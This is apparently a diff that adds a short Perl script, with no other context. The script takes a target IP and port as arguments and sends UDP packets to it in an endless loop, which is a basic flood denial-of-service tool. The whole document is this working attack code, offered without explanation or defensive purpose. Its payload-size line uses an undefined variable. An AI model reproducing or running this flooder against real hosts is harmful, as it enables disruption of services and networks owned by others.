@@ -1,0 +1,15 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+if ($ARGC !=2) {
+ exit(1);
+}
+my ($ip,$port,$size);
+ $ip=$ARGV[0];
+ $port=$ARGV[1];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+    $iaddr = inet_aton("$ip");
+for (;;) {
+ $size=$rand x $rand x $rand;
+ send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
